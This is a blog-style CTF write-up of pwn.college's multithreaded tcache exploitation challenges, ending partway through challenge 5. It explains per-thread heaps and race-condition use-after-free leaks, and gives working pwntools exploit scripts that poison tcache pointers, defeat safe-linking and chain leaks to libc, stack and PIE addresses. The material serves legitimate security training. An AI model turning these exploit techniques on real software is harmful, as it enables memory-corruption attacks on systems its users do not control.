---
layout: post
title:  "Pwn College - Multithreaded Tcache Exploitation"
date:   2024-05-21 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

This module deals with exploiting the tcache in a multithreaded environment. It implies new challenges, such as surprise allocations and less reliable vulnerabilities (UAFs that occurs only between threads). For all challenges, the approach is to create generic R/W primitives, that internally would exploit a UAF vuln caused by the multithreaded environment. \
There are 2 major steps for every challenge:

1. Forge as-generic-as-possible R/W primitives. These have to work with decent statistics, as we'd like to perform multiple reads and optionally multiple writes for the exploit itself. A R/W primitive that has `50%` chance of winning the race, have `50% ^ 5 = 3.125%` chance of winning the exploit (using 4 reads + 1 write). 

2. Use the primitives to leak addresses in a reliable way. For example, once having a libc leak, obtain a PIE addr leak that would work `100%` of the time (given the R/W primitives work). 

Challenges 1-6 focus on read-primitive tricks of reliable techniques to leak different memory regions of the program. By forging an initial thread local heap leak, we have to leak all of the other parts of the binary (main heap, thread heap, thread stack, main stack, PIE addr, libc, ld, etc) in a reliable way. \
Challenges 7-10 foucs more on the write primitive. There's nothing really too fancy for most of them, but challenge 10 required some deep understanding of file streams internals. 

Overall, this module is a bit repetitive, yet challenging (especially debugging challenge 10..) and teaches many great techniques. 

## Background

### Heap Information Disclosure Via Races

For a single-threaded application, in order to exploit the heap, for example using a tcache poisoning (overwriting freed chunk `next`), a tcache pointer leak was sufficient to resolve any heap address. \
However, for the multithreaded scenario, this is no longer the case. There are actually multiple heaps, one for every thread, each having its own associated arena. This means that **the leaks will be pointers to the specific thread's heap**. This means that the addresses received by `malloc` are different for every thread, even in case of the same ordering. \
The following POC demonstrates this:

```c
void *thread_main(void *x) {
    printf("%p\n", malloc(1024));
    pthread_exit(0);
}

int main(){
    printf("%p\n", malloc(1024));
    pthread_t t1, t2, t3;
    pthread_create(&t1, NULL, thread_main, NULL);
    pthread_create(&t2, NULL, thread_main, NULL);
    pthread_create(&t3, NULL, thread_main, NULL);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);
}
```

Upon running this program, similar output would be printed:

```bash
0x4052a0
0x7ffff0000b70
0x7fffe8000b70
0x7fffe8000f80

pwndbg> arenas
arena type    arena address    heap address       map start         map end    perm    size    offset              file
--------------  ---------------  --------------  --------------  --------------  ------  ------  --------  ----------------
    main_arena   0x7ffff7faeac0        0x405000        0x405000        0x426000    rw-p   21000         0            [heap]
non-main arena   0x7fffe8000030  0x7fffe80008d0  0x7fffe8000000  0x7fffe8021000    rw-p   21000         0  [anon_7fffe8000]
non-main arena   0x7ffff0000030  0x7fffef8008d0  0x7fffef800000  0x7ffff0021000    rw-p  821000         0  [anon_7fffef800]
```

Indeed, we can see the main thread have performed allocations from its main heap, resulting in the "regular" address space we are familiar with of the heap. \
However, for non-main heaps, allocations were from different memory regions (due to `mmap`), right past the heap and before libc:

```bash
0x404000           0x405000 rw-p     1000   3000 /home/hacker/test                                                                                                                                                                                       
          0x405000           0x426000 rw-p    21000      0 [heap]                                                                                                                                                                                                  
    0x7fffe8000000     0x7fffe8021000 rw-p    21000      0 [anon_7fffe8000]
    0x7fffe8021000     0x7fffec000000 ---p  3fdf000      0 [anon_7fffe8021]
    0x7fffef7ff000     0x7fffef800000 ---p     1000      0 [anon_7fffef7ff]
    0x7fffef800000     0x7ffff0021000 rw-p   821000      0 [anon_7fffef800]                                                                                                                                                                                        
    0x7ffff0021000     0x7ffff4000000 ---p  3fdf000      0 [anon_7ffff0021]                                                                                                                                                                                        
    0x7ffff6da6000     0x7ffff6da7000 ---p     1000      0 [anon_7ffff6da6]                                                                                                                                                                                        
    0x7ffff6da7000     0x7ffff75a7000 rw-p   800000      0 [anon_7ffff6da7]
```

Interestingly, after every non-main heap pages, there is a large chunk of memory, in which the heap may expand to, in case it is needed. This is where the thread's stack is being allocated from. Also, this means that every thread for this libc version may have an heap + stack regions of up to `0x4000000` bytes. \
In addition, this region is mapped without any permission bits. This denotes that these pages are saved to be serving allocations requests, of either stack or the heap. Moreover, there are guard pages, right before every arena start. They defeat exploitation of linear heap overflows in case of crossing between thread's arenas. \
However, notice that there is a constant pages offset between the last allocated heap and a loaded library:

```bash
0x7fffef800000     0x7ffff0021000 rw-p   821000      0 [anon_7fffef800]                                                                                                                                                                                        
    0x7ffff0021000     0x7ffff4000000 ---p  3fdf000      0 [anon_7ffff0021]                                                                                                                                                                                        
    0x7ffff75a7000     0x7ffff75ab000 r--p     4000      0 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1  
    0x7ffff75ab000     0x7ffff75c6000 r-xp    1b000   4000 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1
    0x7ffff75c6000     0x7ffff75ca000 r--p     4000  1f000 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1
    0x7ffff75ca000     0x7ffff75cb000 r--p     1000  22000 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1
    0x7ffff75cb000     0x7ffff75cc000 rw-p     1000  23000 /nix/store/nda0h04bakn2damsd06vkscwi5ds4qjd-xgcc-13.2.0-libgcc/lib/libgcc_s.so.1
```

Since this high-address heap is actually the heap of the **FIRST** born thread (as new `mmap` calls would be made towards lower addresses), we'd usually like to perform the exploit from the first generated thread, in case it is possible. That would mean we would be able to bypass the pages randomization between the thread's arenas. \
Notice, howoever, that the adjacent library may not always be `libc` (as in the example). This is due to `ld` and `libc` being early `mmap`ed libraries. However, unlike the tcache heaps, the libaries offsets are constant :)

Notice another interesting behavior here - while 2 of the allocations had the exact same LSBs, which is expected as each thread have its own heap, the last one did not. In particular, it seems like its chunk was allocated from the previous thread's heap! This is due to the second thread terminating and reclaimed before the third thread, hence the second thread's heap was reused by the third. This is verified, as we can see only 2 non-main arenas were generated. 

In addition, for the main heap, we can see its arena resides **within a libc memory region**:

```bash
0x7ffff7fae000     0x7ffff7fb0000 rw-p     2000 1dd000 /nix/store/dbcw19dshdwnxdv5q2g6wldj6syyvq7l-glibc-2.39-52/lib/libc.so.6
```

This means that upon achieving a libc leak, we can navigate towards the arena address of the main heap! \
However, for all non-main heaps, their corresponding arenas were allocated within the start of the heap itself.  

#### MT Tricks

Recall `printf`. A naive implementation of it would be something as follows:

```c
int naive_printf(const char *str)
{
    int length = strlen(str);
    write(1, str, length);
}
```

However, in case there's no locking being used, this function is vulnerable to MT, as other thread-2 may shrunk `str`, right between thread-1 `length` calculation and its `write` to stdout. \
The interesting part is, **THAT IS THE IMPLEMENTATION OF PRINTF** (aside from parsing format string tokens..). This means that by simply having a MT program with a `printf` call of some memory address that is shared among threads, we can obtain leak (for example, if the other thread `free`s that address). \
Moreover, because `write` is a syscall while `strlen` is a library call, this race have good odds of winning!

### Memory Forensics

Notice that sometimes we would have a thread's arena leak, and we'd like a libc leak. \
While the `main_arena` resides within a constant offset within libc (hence resolving it would acquire us reliable libc leak), other arenas do not - as there are random amount of pages being allocated between libc mappings and the various arenas. \
However, usually that number of pages is very low (max 2 bytes) - and can be easily brute-forceable. 
This means that we can actually turn any thread's arena leak into a libc leak (which translates to stack leak via `environ`). \
In particular, notice that for memory regions allocated by `mmap`, there's usually some small amount of pages boundary in-between. These are all brute-force able relatively easily. 

Moreover, the following [great article][memory-leaks] contains great region-leaking techniques:

1. **PIE program addr -> libc addr**: easy, by reading a GOT entry

2. **Stack addr -> PIE addr**: easy, just read some return addr

3. **Stack addr-> libc addr**: easy, just read garbage at the stack. libc addr WILL be there. 

4. **Main heap addr -> libc addr**: pointers to libc within the heap

5. **Thread heap addr -> libc addr**: pointers to `main_arena`

6. **libc addr -> heaps addr (both main and thread's)**: pointers in bins within `main_arena`

7. **(Very cool) libc addr -> stack addr**: read symbols `environ` or `__libc_argv`

8. **(Insanely cool) libc addr -> PIE program addr**: first leak an ld address, which is usually constant offset from libc. Otherwise, read libc's `_dl_runtime_resolve` GOT entry, which is an ld addr. Then read `_dl_rtld_libname->name`, which holds pointer to the `.interp` section of the main binary. 

9. **PIE addr -> any library addr**: Read `link_map`, and traverse the loaded `.so` linked list. 

There's also the option to retrieve stack addr out of non-main thread's heap, as they are usually differ by some small amount of pages and may be retrieved by 16-bit brute-force. 
However, all of the above together yields a full pointers path between all of the loaded program's memory regions, in a reliable way (no need to brute force anything). I find this extremely cool. 

### Arbitrary R / W

Some gotchas including a positive value for tcachebin `count`. In that case, allocations would be made, racing with our exploit. We'd like to make sure the `count` of the bin is set to `0` after we've allocated a chunk at the arbitrary address. That way, other `malloc` calls would be performed off completely different memory regions. Another way to bypass this, is to create a new thread for each attempt. Because the tcache is a per-thread resource, the tcache metadata would be re-initialized for each invocation. \
Another gotcha is not paying attention to any side effects caused by the R / W implementations. For example, if the arbitrary read imlementation internally `malloc`'s a target addres via tcache poisioning, it actually nullifies the second qword. \
Another gotcha - It is pretty common we'd have to avoid whitespace characters while developing the exploit. \
One way to get adequate gadgets:

```python
import string 
# There are total of 6 whitespace characters. 
# We can also just avoid 0x09-0x0e, 0x20
libc_rop = ROP(libc, badchars=string.whitespace)
libc_rop.call('exit', [42])
write(libc_rop.chain())
```

Lastly, for complex systems we sometimes need an fd's value, while we cannot read not predict it deterministically. A possible approach is to `close(fd)`, so that the next call to `open` would be our known closed `fd`. 

## Challenge 1

Our goal is to forge an arbitrary read primitive, under multithreaded environment. \
My idea is to use tcache poisioning for the `next` ptr of a free chunk. However, can only trigger a UAF by winning a race, as there's no vuln in the single-threaded application. 

Recall our goal ordering (all within thread-1):

```bash
malloc 0
malloc 1
free 1
free 0
printf 0 
```

However, notice that theres a global `stored` array, which tracks whether or not a chunk is free. This means we would have to perform a race between the second `free`, that would be done by thread-1, and the `printf`, that would be done by thread-2. \
Our wanted ordering:

```bash
free(0)  # T1
(printf) is stored[0] == 1? true # T2
stored[0] = 0  # T1
printf(0)  # T2
```

Where the actual atomic operation needed, is the check of `stored[0] == 1`. 

A key observation I've had, was when I wrote the `write_nextptr` primitive. Originally, it was something as follows (`fork` is used as python's threads are a lie):

```python
if os.fork() == 0:
    for _ in range(iterations):
        malloc(r1, 0)
        malloc(r1, 1)
        free(r1, 1)
        free(r1, 0)
    os.kill(os.getpid(), signal.SIGKILL.value)
else:
    for _ in range(iterations):
        new_next = p64(addr ^ heap_key)
        scanf(r2, 0, new_next)
```

I've done so, in order to make a scenario where the second `free` is raced with the other thread's `scanf`, hence the `next` is successfully overwritten. \
However, there's one VERY bad problem with this approach - because there are actually 2 allocations, we would implicitly not only overwrite the `next` ptr, but also **ALLOCATE** it. \
A clever trick we can do in order to solve this issue, is to make sure we only make one allocation within thread-1, removing `malloc(1), free(1)` requests. But if thats the case, how would we initialize a `next` ptr within `slot[0]` chunk? Simple - before starting the exploit, run a dedicated method, `warm_tcache`, which would do the following:

```python
def warm_tcache(p):
    malloc(p, 0)
    malloc(p, 1)
    free(p, 1)
    free(p, 0)
```

That would make sure that the state in which the exploit starts is a tcache of `count = 2`, having a valid `next` ptr for the first allocation. \
Since there's no time frame in which two allocations are made, we are OK - and our goal overwritten `next` ptr wouldn't be implicitly allocated. \
Moreover, another optimization is to instead of sending a single `scanf` via every iteration, to send bunch of them at once. 

I've made some generic methods for arbitrary read and write, in order to solve the whole module easily. 

```python
#!/bin/python

from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from pwn import *
import os, sys
import struct
import time
import shutil
import binascii
import signal
import array
import textwrap
import string
import logging
BINARY = glob('/challenge/baby*')[0]
LIBC = '/challenge/lib/libc.so.6'
GDB_SCRIPT= '''
set follow-fork-mode parent

c
'''


context.arch = 'amd64'
libc = ELF(LIBC)
libc_rop = ROP(LIBC, badchars=string.whitespace)


def malloc(p, index):
    log.info(f'malloc index: {index}')
    buf = b'malloc '
    buf += str(index).encode()
    p.sendline(buf)
    
def free(p, index):
    log.info(f'free index: {index}')
    buf = b'free '
    buf += str(index).encode()
    p.sendline(buf)

def scanf(p, index, data, batch=1):
    log.info(f'scanf index: {index}')
    buf = b'scanf '
    buf += str(index).encode() + b' '
    buf += data + b' '
    buf *= batch
    p.sendline(buf)

def printf(p, index, batch=1):
    log.info(f'printf index: {index}')
    buf = b'printf '
    buf += str(index).encode() + b' '
    buf *= batch
    p.sendline(buf)
    p.recvuntil(b'MESSAGE: ')
    message = p.readline()[:-1]
    return message

def send_flag(p, secret):
    p.sendline(b'send_flag')
    p.recvuntil(b'Secret: ')
    p.sendline(secret)
    for _ in range(3):
        print(p.readline())

def allocate_at_addr(r1, r2, key, index, addr, debug=False):
    '''
    Allocates chunk at specified addr, taking safe-linking into account. 
    The result is saved in [index + 1].
    SIDE EFFECT: Corrupts slots [index], and nullifies [addr + 8]. 
    '''
    assert((addr & 0xf) == 0)
    for char in string.whitespace:
        if char.encode() in p64(addr):
            raise Exception(f'addr: {hex(addr)} contains bad character: "{char}"')

    write_nextptr(r1, r2, key, addr, index, debug)
    # Allocate chunk right on the addr, store at [index + 1], and never free it (as not all addresses are free-able)
    malloc(r1, index + 2)
    malloc(r1, index + 1) 

    return

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

def demangle_ptr(mangled):
    o = mangle(mangled, mangled)
    ptr = (o >> 24) ^ o
    key = ptr ^ mangled
    # Perform semi-brute force, to generalize demangling of up to 0x10 pages difference between pos and ptr. 
    for i in range(0x10):
        candid_key = key - i
        candid_ptr = mangled ^ candid_key
        if ((candid_ptr & 0xf) == 0):
            return candid_ptr, candid_key

    raise('demangling failed!')

def read_nextptr(r1, r2):
    leaks = list()
    iterations = 20000
    if os.fork() == 0:
        for _ in range(iterations):
            # Because we've warmed up, the tcache has filled, and no need for 2 allocations
            malloc(r1, 0)
            free(r1, 0)
        os.kill(os.getpid(), signal.SIGKILL.value)
    else:
        for _ in range(iterations):
            data = printf(r2, 0)
            leaks.append(data)
    os.wait()

    leaks = set(leaks)
    for leak in leaks:
        if (len(leak) == 6) and (leak[-1] == 0x7f):
            mangled_heap_ptr = leak + b'\x00' * 2
            break
    
    mangled_heap_ptr = u64(mangled_heap_ptr)
    return mangled_heap_ptr

def write_nextptr(r1, r2, key, addr, index, debug=False):
    iterations = 1000
    if os.fork() == 0:
        # Child
        for _ in range(iterations):
            malloc_free_command = buf = b'malloc ' + str(index).encode() + b' free ' + str(index).encode() + b' '
            malloc_free_command *= 100
            r1.sendline(malloc_free_command)
        os.kill(os.getpid(), signal.SIGKILL.value)
    else:
        # Parent
        for _ in range(iterations):
            new_next = p64(addr ^ key)
            scanf(r2, index, new_next, 100)  # Can optimize this, do not re-gen string every iteration
    os.wait()

    return


def arbitrary_read(r1, r2, key, addr, index, paddings_size=0, debug=False):
    '''
    Internally, corrupts slot [index]
    Has a side effect of nullifying some bytes near the leak, as a malloc chunk is being allocated and chunk->key = NULL. 
    Therefore, choose addr wisely
    '''
    read_addr = addr - paddings_size
    # Allocate the chunk within a fresh slot, index + 1. It would never be freed from there.
    allocate_at_addr(r1, r2, key, index, read_addr, debug)

    # Trick - for non aligned reads, allocate a chunk at [addr - paddings_size], and fill it with paddings_size crap bytes. 
    if paddings_size:
        pad_bytes = b'A' * paddings_size
        scanf(r1, index + 1, pad_bytes)
    buf = printf(r1, index + 1)
    print(f'Obtained read buf: {buf}')
    # Restore state, now [index + 2] -> [index + 3] within the tcache
    # At this point, the tcache is empty. Add another allocation and free it. 
    # That way the tcache would have 2 available chunks, and the tcache invariant holds. 
    malloc(r1, index + 3)
    free(r1, index + 3)
    free(r1, index + 2)
    
    return buf


def arbitrary_write(p, heap_key, addr, values):
    '''
    Internally, corrupts slots 0, 1, 2. 
    Has a side effect of nullifying some bytes near the allocation, as a malloc chunk is being allocated and chunk->key = NULL. 
    Therefore, choose addr wisely
    '''
    lsb_nibble = addr & 0xf
    assert(lsb_nibble == 0 or lsb_nibble == 8)
    if lsb_nibble == 8:
        paddings_size = 0x8     
    elif lsb_nibble == 0:
        paddings_size = 0x0

    values = b'A' * paddings_size + values  # Since the allocation may be 8 bytes before the goal address, we have to supply extra padding
    chunk_size = len(values) + (0x10 - (len(values) % 0x10)) + 8  # Make sure the allocated chunk is large enough, and contains nibble of 0x8
    allocate_at_addr(p, addr - paddings_size, 0, chunk_size, heap_key)
    safe_read(p, 0, values)
    
    return

def warm_tcache(p, index=0):
    malloc(p, index)
    malloc(p, index + 1)
    free(p, index + 1)
    free(p, index)

def main():    
    debug = False
    if debug:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)

    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    # Phase 1 - leak a mangled heap pointer
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    heap_base = heap_next - heap_next_to_heap_base_offset
    assert(heap_base & 0xfff == 0)
    print(f'heap_base: {hex(heap_base)} heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    main_arena_heap_addr = heap_base + main_arena_heap_offset
    print(f'main_arena_heap_addr: {hex(main_arena_heap_addr)}')

    # Phase 2 - leak libc address using the allocated stream
    log.info("Reading libc address")
    main_arena_libc_offset = 0xc80
    environ_libc_offset = 0x8200
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + environ_libc_offset
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')
    
    # Phase 3 - leak stack address
    # key: (heap_next - allocation_size) >> 12
    # Notice: because of the smart tcache invariant, we dont have to track allocations.
    # The reason is that all allocations are being made from the same, the first, chunk :)
    log.info("Reading stack address")
    environ_stack_addr = arbitrary_read(r1, r2, heap_key, addr=environ_libc, index=2)  
    assert(len(environ_stack_addr) == 6)
    environ_stack_addr = u64(environ_stack_addr + b'\x00' * 2)
    print(f'environ_stack_addr: {hex(environ_stack_addr)}')
    
    # Phase 4 - read program .bss
    secret_addr = 0x4054c0
    print(f'Leaking secret addr from: {hex(secret_addr)}')
    secret_leak = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=4)
    print(f'secret: {secret_leak}')

    # Win
    send_flag(r1, secret_leak)

    p.interactive()


if __name__ == '__main__':
    main()
```

## Challenge 2 

Now that I have generic R / W primitives, all of these challenges are very easy and repetitive. The whole module was challenge 1, lol. \
Now the secret is loaded to the thread's heap.

```python
def exploit():
    p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    heap_next_to_heap_base_offset = 0x1380
    main_arena_heap_offset = 0x8a0
    # Phase 1 - leak a mangled heap pointer
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)} heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')

    # Phase 4 - read thread's heap
    secret_addr = r1_heap_base + 0xf50
    print(f'Leaking secret addr from: {hex(secret_addr)}')
    secret_leak = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=4)
    print(f'secret: {secret_leak}')

    # Win
    send_flag(r1, secret_leak)
    p.interactive()
```

## Challenge 3

Now our goal is to read off the thread's stack. \
This one is abit tricky. While having a leak of the main thread's stack is relatively easy (via `environ` for example), leaking a non-main thread stack isn't forward. 

There are two approaches: \
The first and obvious a leak to that memory region elsewhere, for example search a pointer from the thread's heap to its stack:

```bash
pwndbg> p2p anon_7f5ad4000 anon_7f5adc705
00:0000│  0x7f5ad4000c58 —▸ 0x7f5adcf04640 ◂— 0x7f5adcf04640
```

The second approach is to notice the fact that since we're exploiting the first generated thread, its memory mappings are being allocated adjacent to libc mappings:

```bash
pwndbg> vmmap 0x7f5adcf03850
0x7f5adc704000     0x7f5adc705000 ---p     1000      0 [anon_7f5adc704]
0x7f5adc705000     0x7f5adcf08000 rw-p   803000      0 [anon_7f5adc705]
0x7f5adcf08000     0x7f5adcf30000 r--p    28000      0 /challenge/lib/libc.so.6
```

This means that `libc` leak would resolve to the first thread's stack leak! \
Personally I prefer the first approach (although the second is cooler), as the distance between the leaked thread-stack leak and the goal secret pointer is considerabily lower than the libc leak. This means that the probability of stuff being messed up within allocations in between is lower, making the exploit more reliable. \
However, notice that the stack address within the heap is very problematic - it isn't aligned, and it always contains a bad character `\x0c` that would truncate `scanf` operation. 

After doing some research, I've found there are actually multiple other pointers towards the thread's stack - within the main heap and the main stack!

```bash
pwndbg> p2p heap anon_7f80725a4
00:0000│  0x55b07b6e92e0 —▸ 0x7f8072da3630 —▸ 0x7f806c000b70 ◂— 0xfbad248b
00:0000│  0x55b07b6e92f0 —▸ 0x7f8072da35a0 —▸ 0x7f8072fc1580 —▸ 0x7f8072fbd820 —▸ 0x7f8072f811d7 ◂— ...
pwndbg> p2p stack anon_7f80725a4
00:0000│  0x7ffc7e0b4cd8 —▸ 0x7f8072da4740 ◂— 0x7f8072da4740
00:0000│  0x7ffc7e0b4e60 —▸ 0x7f8072da3640 ◂— 0x7f8072da3640
00:0000│  0x7ffc7e0b4e80 —▸ 0x7f8072da3950 ◂— 0
00:0000│  0x7ffc7e0b4ea0 —▸ 0x7f8072da3640 ◂— 0x7f8072da3640
```

Therefore, I've used the main stack in order to leak address of the thread-specific stack:

```python
def exploit():
    p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    # Phase 1 - leak a mangled heap pointer
    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')
    
    # Phase 2 - leak libc address using the allocated stream
    log.info("Reading libc address")
    main_arena_libc_offset = 0xc80
    environ_libc_offset = 0x8200
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_r1_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    print(f'main_arena_libc_addr: {hex(main_arena_libc_addr)}')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + environ_libc_offset
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')

    # Phase 3 - leak stack address
    # key: (heap_next - allocation_size) >> 12
    # Notice: because of the smart tcache invariant, we dont have to track allocations.
    # The reason is that all allocations are being made from the same, the first, chunk :)
    log.info("Reading stack address")
    environ_stack_addr = arbitrary_read(r1, r2, heap_key, addr=environ_libc, index=2)  
    assert(len(environ_stack_addr) == 6)
    environ_stack_addr = u64(environ_stack_addr + b'\x00' * 2)
    print(f'environ_stack_addr: {hex(environ_stack_addr)}')
    
    # Read thread stack using a pointer resides within the main thread's stack
    thread_stack_to_environ_offset = 0x718
    thread_stack_leak_main_stack_addr = environ_stack_addr - thread_stack_to_environ_offset
    print(f'thread_stack_leak_main_stack_addr: {hex(thread_stack_leak_main_stack_addr)}')
    thread_stack_leak = arbitrary_read(r1, r2, heap_key, addr=thread_stack_leak_main_stack_addr, index=4)
    assert(len(thread_stack_leak) == 6)
    thread_stack_leak = u64(thread_stack_leak + 2 * b'\x00')
    secret_to_stack_leak_offset = 0xdf0
    secret_addr = thread_stack_leak - secret_to_stack_leak_offset
    print(f'thread_stack_leak: {hex(thread_stack_leak)} secret_addr: {hex(secret_addr)}')

    # Read the secret off the thread's stack
    secret = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=6)
    print(f'secret: {secret}')

    # Win
    send_flag(r1, secret)
    p.interactive()
```

Notice the route we've taken:

```bash
thread_heap -> libc_addr
libc_addr -> main_stack
main_stack -> thread_stack
```

Although there was direct pointer between the thread's heap towards the thread's stack, however its address contained white characters that couldn't escape. \
The "filler" trick, where we perform allocation before our goal address, and write junk bytes before the target address, should work. 

## Challenge 4

Our goal is to retrieve PIE base addr. \
While we can do this via stack leakage for sure, I'd always prefer retrieving it from library memory regions instead, as they are less prone to changes during runtime. \
There's a cool trick that allows leaking the PIE address off libc, by reading `_dl_rtld_libname->name`, which holds a pointer to the `interp` section of the main binary:

```bash
pwndbg> p2p /challenge/lib/ld-linux-x86-64.so.2 /challenge/babyprime_level4.0
00:0000│  0x7f02a91b9a80 —▸ 0x564789f09000 ◂— 0x10102464c457f
```

An important gotcha, is the fact that most of the `ld` mappings are actually read-only. This means we won't be able to allocate a tcache chunk (as it would write `p->key = NULL`) there. 

```python
def exploit():
    p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    # Leak a mangled heap pointer
    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')
    
    # Leak libc address using the thread's heap
    log.info("Reading libc address")
    main_arena_libc_offset = 0x219c80
    main_arena_libc_addr = arbitrary_read(r1, r2, heap_key, addr=main_arena_r1_heap_addr, index=0)
    assert(len(main_arena_libc_addr) == 6)
    main_arena_libc_addr = u64(main_arena_libc_addr + 2 * b'\x00')
    print(f'main_arena_libc_addr: {hex(main_arena_libc_addr)}')
    libc_base = main_arena_libc_addr - main_arena_libc_offset    
    environ_libc = libc_base + libc.symbols['environ']
    chmod_addr = libc_base + libc.symbols['chmod']
    pop_rdi_ret = libc_base + libc_rop.rdi.address
    pop_rsi_ret = libc_base + libc_rop.rsi.address
    assert(libc_base & 0xfff == 0)
    print(f'libc_base: {hex(libc_base)} environ_libc: {hex(environ_libc)} chmod_addr: {hex(chmod_addr)}')

    # Leak PIE base address via libc->ld
    libc_to_ld_offset = 0x22a000
    ld_base = libc_base + libc_to_ld_offset
    print(f'ld_base: {hex(ld_base)}')
    dl_pie_leak_addr = ld_base + 0x3b2f0
    pie_leak_offset = 0x4ca8
    print(f'dl_pie_leak_addr: {hex(dl_pie_leak_addr)}')
    pie_base = arbitrary_read(r1, r2, heap_key, addr=dl_pie_leak_addr, index=2)
    assert(len(pie_base) == 6)
    pie_base = u64(pie_base + 2 * b'\x00') - pie_leak_offset
    print(f'pie_base: {hex(pie_base)}')
    assert((pie_base & 0xfff) == 0)

    # Read the secret
    secret_addr = pie_base + 0x5380
    secret = arbitrary_read(r1, r2, heap_key, addr=secret_addr, index=6)
    print(f'secret: {secret}')

    # Win
    send_flag(r1, secret)
    p.interactive()
```

## Challenge 5

Simply reading `environ` offset.

```python
def exploit():
    p = process(BINARY)
    time.sleep(3)
    log.setLevel(logging.WARNING)
    r1 = remote('localhost', 1337)
    r2 = remote('localhost', 1337)
    warm_tcache(r1, index=0)
    allocation_size = 0x410

    # Leak a mangled heap pointer
    heap_next_to_heap_base_offset = 0x1340
    main_arena_heap_offset = 0x8a0
    mangled_heap_next = read_nextptr(r1, r2)
    print(f'mangled_heap_next: {hex(mangled_heap_next)}')
    heap_next, heap_key = demangle_ptr(mangled_heap_next)
    r1_heap_base = heap_next - heap_next_to_heap_base_offset
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')
    assert(r1_heap_base & 0xfff == 0)
    print(f'r1_heap_base: {hex(r1_heap_base)}')
    main_arena_r1_heap_addr = r1_heap_base + main_arena_heap_offset
    print(f'main_arena_r1_heap_addr: {hex(main_arena_r1_heap_addr)}')

    # Leak libc address using the thread's heap
    log.info("Reading libc address")
